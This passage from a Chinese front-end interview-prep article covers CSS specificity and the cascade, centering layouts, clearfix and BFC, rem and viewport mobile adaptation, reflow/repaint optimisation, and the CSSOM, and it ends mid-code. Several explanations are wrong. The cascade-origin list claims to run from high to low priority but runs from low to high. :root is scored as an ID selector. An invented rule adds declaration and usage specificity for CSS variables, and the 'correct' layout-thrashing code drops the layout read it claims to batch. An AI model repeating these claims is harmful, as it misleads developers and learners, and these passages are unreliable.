id="权重实战考察"><a href="#权重实战考察" class="headerlink" title="权重实战考察"></a>权重实战考察</h3><p><strong>Q：判断以下样式的最终生效颜色？</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs HTML">&lt;div id=&quot;box&quot; class=&quot;container warning&quot; style=&quot;color: yellow&quot;&gt;Text&lt;/div&gt;<br></code></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-id">#box</span> &#123; <span class="hljs-attribute">color</span>: red; &#125;            <span class="hljs-comment">/* A */</span><br><span class="hljs-selector-class">.container</span> &#123; <span class="hljs-attribute">color</span>: blue; &#125;     <span class="hljs-comment">/* B */</span><br><span class="hljs-selector-tag">div</span><span class="hljs-selector-class">.warning</span> &#123; <span class="hljs-attribute">color</span>: green; &#125;   <span class="hljs-comment">/* C */</span><br><span class="hljs-selector-tag">div</span> &#123; <span class="hljs-attribute">color</span>: orange <span class="hljs-meta">!important</span>; &#125; <span class="hljs-comment">/* D */</span><br></code></pre></td></tr></table></figure><p>分析过程：</p><ul><li>ABCD 和行内样式的权重分别为：<ul><li>A：0,1,0,0</li><li>B：0,0,1,0</li><li>C：0,0,1,1</li><li>D：1,0,0,1</li><li>行内样式：1,0,0,0</li></ul></li><li>对比各权重：D 的权重最高 -&gt; 最终 orange 颜色生效</li></ul><h3 id="层叠规则高阶问题"><a href="#层叠规则高阶问题" class="headerlink" title="层叠规则高阶问题"></a>层叠规则高阶问题</h3><p><strong>Q：在相同权重下，样式如何决定优先级？</strong></p><p>完整层叠顺序</p><ul><li><code>!important</code> 声明</li><li>来源优先级（从高到低）：<ul><li>用户代理样式（浏览器默认）</li><li>用户样式表</li><li>开发者样式表</li><li>开发者 <code>!important</code></li><li>用户 <code>!important</code></li></ul></li><li>选择器权重</li><li>代码顺序（后定义的覆盖先定义）</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-comment">/* 样式表A */</span><br><span class="hljs-selector-pseudo">:root</span> &#123; <span class="hljs-attr">--color</span>: red; &#125;<br><span class="hljs-selector-class">.box</span> &#123; <span class="hljs-attribute">color</span>: <span class="hljs-built_in">var</span>(--color); &#125;<br><br><span class="hljs-comment">/* 样式表B（后加载） */</span><br><span class="hljs-selector-pseudo">:root</span> &#123; <span class="hljs-attr">--color</span>: blue; &#125;<br></code></pre></td></tr></table></figure><p>最终颜色为 blue（变量遵循代码顺序）</p><h3 id="CSS-变量与权重考察"><a href="#CSS-变量与权重考察" class="headerlink" title="CSS 变量与权重考察"></a>CSS 变量与权重考察</h3><p><strong>Q：CSS自定义属性的权重如何计算？</strong></p><p>关键规则：</p><ul><li>变量本身没有权重，继承所在规则的权重</li><li>使用 var() 时，最终值权重&#x3D;变量声明权重 + 使用处选择器权重</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-pseudo">:root</span> &#123; <span class="hljs-attr">--text-color</span>: red; &#125; <span class="hljs-comment">/* 权重：0,1,0,0 */</span><br><span class="hljs-selector-id">#box</span> &#123; <span class="hljs-attr">--text-color</span>: blue; &#125; <span class="hljs-comment">/* 权重：0,1,0,0 */</span><br><span class="hljs-selector-tag">p</span> &#123; <span class="hljs-attribute">color</span>: <span class="hljs-built_in">var</span>(--text-color); &#125; <span class="hljs-comment">/* 继承变量声明处的权重 */</span><br></code></pre></td></tr></table></figure><p>此时 <code>&lt;div id=&quot;box&quot;&gt;&lt;p&gt;Text&lt;/p&gt;&lt;/div&gt;</code> 显示蓝色（相同权重下后定义生效）</p><h2 id="6-2-居中布局的-N-种方式"><a href="#6-2-居中布局的-N-种方式" class="headerlink" title="6.2 居中布局的 N 种方式"></a>6.2 居中布局的 N 种方式</h2><h3 id="水平居中"><a href="#水平居中" class="headerlink" title="水平居中"></a>水平居中</h3><p><strong>行内&#x2F;行内块元素</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.parent</span> &#123;<br>  <span class="hljs-attribute">text-align</span>: center; <span class="hljs-comment">/* 传统方案 */</span><br>&#125;<br><span class="hljs-selector-class">.child</span> &#123;<br>  <span class="hljs-attribute">display</span>: inline-block;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>块级元素（固定宽度）</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.child</span> &#123;<br>  <span class="hljs-attribute">width</span>: <span class="hljs-number">300px</span>;<br>  <span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span> auto; <span class="hljs-comment">/* 经典auto margins */</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>flexbox 方案</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.parent</span> &#123;<br>  <span class="hljs-attribute">display</span>: flex;<br>  <span class="hljs-attribute">justify-content</span>: center; <span class="hljs-comment">/* 主轴居中 */</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>grid 方案</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.parent</span> &#123;<br>  <span class="hljs-attribute">display</span>: grid;<br>  <span class="hljs-attribute">place-items</span>: center; <span class="hljs-comment">/* 简写属性 */</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="垂直居中"><a href="#垂直居中" class="headerlink" title="垂直居中"></a>垂直居中</h3><p><strong>单行文本</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.parent</span> &#123;<br>  <span class="hljs-attribute">height</span>: <span class="hljs-number">100px</span>;<br>  <span class="hljs-attribute">line-height</span>: <span class="hljs-number">100px</span>; <span class="hljs-comment">/* 行高=容器高度 */</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>表格单元格方式</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.parent</span> &#123;<br>  <span class="hljs-attribute">display</span>: table-cell;<br>  <span class="hljs-attribute">vertical-align</span>: middle; <span class="hljs-comment">/* 垂直居中 */</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>flexbox 方案</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.parent</span> &#123;<br>  <span class="hljs-attribute">display</span>: flex;<br>  <span class="hljs-attribute">align-items</span>: center; <span class="hljs-comment">/* 交叉轴居中 */</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>绝对定位 + 负边距（传统方案）</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.child</span> &#123;<br>  <span class="hljs-attribute">position</span>: absolute;<br>  <span class="hljs-attribute">top</span>: <span class="hljs-number">50%</span>;<br>  <span class="hljs-attribute">height</span>: <span class="hljs-number">100px</span>;<br>  <span class="hljs-attribute">margin-top</span>: -<span class="hljs-number">50px</span>; <span class="hljs-comment">/* 高度的一半 */</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="完全居中（水平-垂直）"><a href="#完全居中（水平-垂直）" class="headerlink" title="完全居中（水平 + 垂直）"></a>完全居中（水平 + 垂直）</h3><p><strong>flexbox 终极方案</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.parent</span> &#123;<br>  <span class="hljs-attribute">display</span>: flex;<br>  <span class="hljs-attribute">justify-content</span>: center;<br>  <span class="hljs-attribute">align-items</span>: center;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>grid 终极方案</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.parent</span> &#123;<br>  <span class="hljs-attribute">display</span>: grid;<br>  <span class="hljs-attribute">place-content</span>: center; <span class="hljs-comment">/* 简写属性 */</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>绝对定位 + transform</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.child</span> &#123;<br>  <span class="hljs-attribute">position</span>: absolute;<br>  <span class="hljs-attribute">top</span>: <span class="hljs-number">50%</span>;<br>  <span class="hljs-attribute">left</span>: <span class="hljs-number">50%</span>;<br>  <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translate</span>(-<span class="hljs-number">50%</span>, -<span class="hljs-number">50%</span>); <span class="hljs-comment">/* 自适应宽高 */</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>绝对定位 + margin auto</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.child</span> &#123;<br>  <span class="hljs-attribute">position</span>: absolute;<br>  <span class="hljs-attribute">inset</span>: <span class="hljs-number">0</span>; <span class="hljs-comment">/* 全方向0 */</span><br>  <span class="hljs-attribute">margin</span>: auto;<br>  <span class="hljs-attribute">width</span>: fit-content;<br>  <span class="hljs-attribute">height</span>: fit-content;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="特殊场景方案"><a href="#特殊场景方案" class="headerlink" title="特殊场景方案"></a>特殊场景方案</h3><p><strong>视口居中（vw&#x2F;vh）</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.modal</span> &#123;<br>  <span class="hljs-attribute">position</span>: fixed;<br>  <span class="hljs-attribute">top</span>: <span class="hljs-number">50vh</span>;<br>  <span class="hljs-attribute">left</span>: <span class="hljs-number">50vw</span>;<br>  <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translate</span>(-<span class="hljs-number">50%</span>, -<span class="hljs-number">50%</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>多行文本居中</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.parent</span> &#123;<br>  <span class="hljs-attribute">display</span>: grid;<br>&#125;<br><span class="hljs-selector-class">.child</span> &#123;<br>  <span class="hljs-attribute">margin</span>: auto; <span class="hljs-comment">/* 神奇的小技巧 */</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>浮动元素居中</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.parent</span><span class="hljs-selector-pseudo">::after</span> &#123;<br>  <span class="hljs-attribute">content</span>: <span class="hljs-string">&quot;&quot;</span>;<br>  <span class="hljs-attribute">display</span>: table;<br>  <span class="hljs-attribute">clear</span>: both;<br>&#125;<br><span class="hljs-selector-class">.child</span> &#123;<br>  <span class="hljs-attribute">float</span>: left;<br>  <span class="hljs-attribute">position</span>: relative;<br>  <span class="hljs-attribute">left</span>: <span class="hljs-number">50%</span>;<br>  <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translateX</span>(-<span class="hljs-number">50%</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="6-3-清除浮动的方法与-BFC-应用"><a href="#6-3-清除浮动的方法与-BFC-应用" class="headerlink" title="6.3 清除浮动的方法与 BFC 应用"></a>6.3 清除浮动的方法与 BFC 应用</h2><h3 id="清除浮动的核心方法"><a href="#清除浮动的核心方法" class="headerlink" title="清除浮动的核心方法"></a>清除浮动的核心方法</h3><p><strong>经典 clear fix 方案（最可靠）</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.clearfix</span><span class="hljs-selector-pseudo">::after</span> &#123;<br>  <span class="hljs-attribute">content</span>: <span class="hljs-string">&quot;&quot;</span>;<br>  <span class="hljs-attribute">display</span>: block;<br>  <span class="hljs-attribute">clear</span>: both; <span class="hljs-comment">/* 关键属性 */</span><br>&#125;<br><span class="hljs-comment">/* 兼容IE6/7 */</span><br><span class="hljs-selector-class">.clearfix</span> &#123;<br>  *<span class="hljs-attribute">zoom</span>: <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>适用场景：所有需要清除浮动的容器</p><p><strong>创建 BFC 容器（现代方案）</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.container</span> &#123;<br>  <span class="hljs-attribute">overflow</span>: hidden; <span class="hljs-comment">/* 或 auto/scroll */</span><br>  <span class="hljs-attribute">display</span>: flow-root; <span class="hljs-comment">/* 最纯净的BFC */</span><br>&#125;<br></code></pre></td></tr></table></figure><p>优势：无需额外 HTML 元素</p><p><strong>空 div 法（不推荐但常见）</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs HTML">&lt;div class=&quot;float-left&quot;&gt;&lt;/div&gt;<br>&lt;div style=&quot;clear: both;&quot;&gt;&lt;/div&gt; &lt;!-- 清除浮动 --&gt;<br></code></pre></td></tr></table></figure><p><strong>伪元素 + table 布局（兼容性最佳）</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.clearfix</span><span class="hljs-selector-pseudo">::after</span> &#123;<br>  <span class="hljs-attribute">content</span>: <span class="hljs-string">&quot;&quot;</span>;<br>  <span class="hljs-attribute">display</span>: table;<br>  <span class="hljs-attribute">clear</span>: both;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="BFC-在清除浮动上的应用"><a href="#BFC-在清除浮动上的应用" class="headerlink" title="BFC 在清除浮动上的应用"></a>BFC 在清除浮动上的应用</h3><p><strong>核心原理</strong></p><p>当元素创建 BFC 时，会形成独立的布局环境，必须包含其内的所有浮动元素，以避免父容器高度塌陷。这是 CSS 规范中明确规定的 BFC 特性之一。</p><p><strong>具体实现方法</strong></p><p>（1）overflow（最常用）</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.container</span> &#123;<br>  <span class="hljs-attribute">overflow</span>: hidden; <span class="hljs-comment">/* 或 auto/scroll */</span><br>  <span class="hljs-comment">/* 触发BFC */</span><br>&#125;<br></code></pre></td></tr></table></figure><p>特点：</p><ul><li>兼容性好（IE7+）</li><li>可能意外裁剪内容或产生滚动条</li></ul><p>（2）display: flow-root（现代方案）</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.container</span> &#123;<br>  <span class="hljs-attribute">display</span>: flow-root; <span class="hljs-comment">/* 专为清除浮动设计 */</span><br>&#125;<br></code></pre></td></tr></table></figure><p>优势：</p><ul><li>无副作用（不会裁剪内容）</li><li>语义明确（Chrome58+&#x2F;Firefox52+&#x2F;Edge16+）</li></ul><p>（3）浮动元素父容器（自清除）</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.container</span> &#123;<br>  <span class="hljs-attribute">float</span>: left; <span class="hljs-comment">/* 自身浮动也创建BFC */</span><br>  <span class="hljs-attribute">width</span>: <span class="hljs-number">100%</span>; <span class="hljs-comment">/* 保持宽度 */</span><br>&#125;<br></code></pre></td></tr></table></figure><p>适用场景：需要兼容 IE6&#x2F;7 的古老项目</p><p>（4）display 表格属性</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.container</span> &#123;<br>  <span class="hljs-attribute">display</span>: table; <span class="hljs-comment">/* 或 inline-table/table-cell */</span><br>  <span class="hljs-attribute">width</span>: <span class="hljs-number">100%</span>; <span class="hljs-comment">/* 需要指定宽度 */</span><br>&#125;<br></code></pre></td></tr></table></figure><p>注意：会改变元素默认显式特性</p><h2 id="6-4-响应式设计与移动端适配（REM、Viewport）"><a href="#6-4-响应式设计与移动端适配（REM、Viewport）" class="headerlink" title="6.4 响应式设计与移动端适配（REM、Viewport）"></a>6.4 响应式设计与移动端适配（REM、Viewport）</h2><h3 id="如何利用-rem-实现移动端适配"><a href="#如何利用-rem-实现移动端适配" class="headerlink" title="如何利用 rem 实现移动端适配"></a>如何利用 rem 实现移动端适配</h3><p><strong>标准答案</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 动态设置根字体大小（推荐1rem=10px比例）</span><br><span class="hljs-variable language_">document</span>.<span class="hljs-property">documentElement</span>.<span class="hljs-property">style</span>.<span class="hljs-property">fontSize</span> = <br>  <span class="hljs-variable language_">document</span>.<span class="hljs-property">documentElement</span>.<span class="hljs-property">clientWidth</span> / <span class="hljs-number">7.5</span> + <span class="hljs-string">&#x27;px&#x27;</span>; <br><span class="hljs-comment">// 设计稿750px时，1rem=100px</span><br></code></pre></td></tr></table></figure><p><strong>配套 CSS</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-comment">/* 配合PostCSS插件自动转换 */</span><br><span class="hljs-selector-class">.btn</span> &#123;<br>  <span class="hljs-attribute">width</span>: <span class="hljs-number">1.6rem</span>; <span class="hljs-comment">/* 设计稿160px → 1.6rem */</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>追问</strong></p><ul><li>为什么用 7.5？：设计稿宽度750px ÷ 100（目标rem值） &#x3D; 7.5</li><li>如何解决字体闪烁？：添加CSS先设置默认字号</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-tag">html</span> &#123; <span class="hljs-attribute">font-size</span>: <span class="hljs-number">50px</span> &#125; <span class="hljs-comment">/* 默认值 */</span><br><span class="hljs-keyword">@media</span> (<span class="hljs-attribute">min-width</span>: <span class="hljs-number">375px</span>)&#123; <span class="hljs-selector-tag">html</span> &#123; <span class="hljs-attribute">font-size</span>: <span class="hljs-built_in">calc</span>(<span class="hljs-number">100vw</span> / <span class="hljs-number">7.5</span>) &#125; &#125;<br></code></pre></td></tr></table></figure><h3 id="viewport-进阶"><a href="#viewport-进阶" class="headerlink" title="viewport 进阶"></a>viewport 进阶</h3><p><strong>Q：<code>&lt;meta name=&quot;viewport&quot;&gt;</code>各参数的作用？</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs HTML">&lt;meta name=&quot;viewport&quot; <br>  content=&quot;width=device-width, <br>          initial-scale=1.0,<br>          maximum-scale=1.0,<br>          user-scalable=no,<br>          viewport-fit=cover&quot;&gt;<br></code></pre></td></tr></table></figure><ul><li>width&#x3D;device-width：视口&#x3D;设备宽度（避免默认980px缩放）</li><li>initial-scale&#x3D;1.0：初始缩放比例</li><li>viewport-fit&#x3D;cover：全面屏适配（iOS专属）</li></ul><p>陷阱：为什么 andriod 不需要设置 viewport-fit？</p><p>Android系统会自动处理刘海屏，而iOS需要显式声明</p><h3 id="如何实现高清屏下的真实-1px-边框？"><a href="#如何实现高清屏下的真实-1px-边框？" class="headerlink" title="如何实现高清屏下的真实 1px 边框？"></a>如何实现高清屏下的真实 1px 边框？</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.border-1px</span> &#123;<br>  <span class="hljs-attribute">position</span>: relative;<br>&#125;<br><span class="hljs-selector-class">.border-1px</span><span class="hljs-selector-pseudo">::after</span> &#123;<br>  <span class="hljs-attribute">content</span>: <span class="hljs-string">&quot;&quot;</span>;<br>  <span class="hljs-attribute">position</span>: absolute;<br>  <span class="hljs-attribute">left</span>: <span class="hljs-number">0</span>;<br>  <span class="hljs-attribute">bottom</span>: <span class="hljs-number">0</span>;<br>  <span class="hljs-attribute">width</span>: <span class="hljs-number">100%</span>;<br>  <span class="hljs-attribute">height</span>: <span class="hljs-number">1px</span>;<br>  <span class="hljs-attribute">background</span>: <span class="hljs-number">#000</span>;<br>  <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">scaleY</span>(<span class="hljs-number">0.5</span>);<br>  <span class="hljs-attribute">transform-origin</span>: <span class="hljs-number">0</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>原理：利用 transform 缩放物理像素，避免直接使用 0.5px 的兼容性问题</p><h2 id="6-5-CSS-渲染优化（减少重排、重绘）"><a href="#6-5-CSS-渲染优化（减少重排、重绘）" class="headerlink" title="6.5 CSS 渲染优化（减少重排、重绘）"></a>6.5 CSS 渲染优化（减少重排、重绘）</h2><h3 id="基础概念考察-1"><a href="#基础概念考察-1" class="headerlink" title="基础概念考察"></a>基础概念考察</h3><p><strong>Q：解释重排（reflow）和重绘（repaint）的区别</strong></p><ul><li>重排：几何属性变更（宽&#x2F;高&#x2F;位置等）导致的布局重新计算，代价高昂</li><li>重绘：外观属性变化（背景&#x2F;颜色等）导致的像素重绘，不涉及布局变化</li><li>关键差异：重排必定触发重绘，反之不会</li></ul><p><strong>Q：哪些CSS属性会触发重排？哪些仅触发重绘？</strong></p><table><thead><tr><th align="left">重排触发属性</th><th align="left">仅重绘属性</th></tr></thead><tbody><tr><td align="left">width&#x2F;height</td><td align="left">color</td></tr><tr><td align="left">margin&#x2F;padding</td><td align="left">background</td></tr><tr><td align="left">display</td><td align="left">border-radius</td></tr><tr><td align="left">font-size</td><td align="left">box-shadow</td></tr><tr><td align="left">获取布局属性(offsetTop)</td><td align="left">visibility: hidden</td></tr></tbody></table><h3 id="深度原理考察"><a href="#深度原理考察" class="headerlink" title="深度原理考察"></a>深度原理考察</h3><p><strong>Q：浏览器渲染管线中如何避免布局抖动（Layout Thrashing）？</strong></p><p>读写分离原则：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 错误写法（交替读写导致多次重排）</span><br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">100</span>; i++) &#123;<br>  el.<span class="hljs-property">style</span>.<span class="hljs-property">width</span> = i + <span class="hljs-string">&#x27;px&#x27;</span>;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(el.<span class="hljs-property">offsetWidth</span>);<br>&#125;<br><br><span class="hljs-comment">// 正确写法（批量读写）</span><br><span class="hljs-keyword">let</span> widths = [];<br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">100</span>; i++) &#123;<br>  el.<span class="hljs-property">style</span>.<span class="hljs-property">width</span> = i + <span class="hljs-string">&#x27;px&#x27;</span>;<br>  widths.<span class="hljs-title function_">push</span>(i);<br>&#125;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(widths);<br></code></pre></td></tr></table></figure><p><strong>Q：如何利用CSS Containment优化渲染性能？</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.widget</span> &#123;<br>  <span class="hljs-attribute">contain</span>: strict; <span class="hljs-comment">/* 最严格的隔离 */</span><br>  <span class="hljs-comment">/* 等效于 contain: size layout paint style */</span><br>&#125;<br></code></pre></td></tr></table></figure><ul><li>原理：限制浏览器重排&#x2F;重绘的影响范围</li><li>适用场景：复杂动画组件、高频更新的UI模块</li></ul><p><strong>Q：请描述从输入URL到页面渲染完成过程中，CSS优化的完整机会点</strong></p><ul><li>资源加载阶段：<ul><li><link rel="preload">关键CSS</li><li>异步加载非关键CSS（media&#x3D;”print”）</li></ul></li><li>解析阶段：<ul><li>减少@import使用</li><li>内联首屏关键CSS（Critical CSS）</li></ul></li><li>渲染阶段：<ul><li>避免同步布局（Force Synchronous Layout）</li><li>使用CSS动画代替JS动画</li></ul></li><li>交互阶段：<ul><li>防抖处理resize&#x2F;scroll事件</li><li>使用passive: true优化触摸事件</li></ul></li></ul><h2 id="6-6-浏览器渲染流程（CSSOM、Critical-CSS）"><a href="#6-6-浏览器渲染流程（CSSOM、Critical-CSS）" class="headerlink" title="6.6 浏览器渲染流程（CSSOM、Critical CSS）"></a>6.6 浏览器渲染流程（CSSOM、Critical CSS）</h2><h3 id="CSSOM-构建过程考察"><a href="#CSSOM-构建过程考察" class="headerlink" title="CSSOM 构建过程考察"></a>CSSOM 构建过程考察</h3><p><strong>Q：描述CSSOM树的构建流程及其阻塞特性</strong></p><ul><li>解析阶段<ul><li>浏览器逐条解析 CSS 规则，生成 CSSOM 树（与 DOM 树并行构建）</li><li><code>@import</code>和<code>&lt;link&gt;</code>会触发同步阻塞（除非显式异步加载）</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs CSS">&lt;!-- 阻塞渲染 --&gt;<br>&lt;link rel=&quot;stylesheet&quot; href=&quot;<span class="hljs-selector-tag">main</span><span class="hljs-selector-class">.css</span>&quot;&gt;<br><br>&lt;!-- 异步加载 --&gt;<br>&lt;link rel=&quot;stylesheet&quot; href=&quot;print<span class="hljs-selector-class">.css</span>&quot; media=&quot;print&quot; onload=&quot;this<span class="hljs-selector-class">.media</span>=&#x27;<span 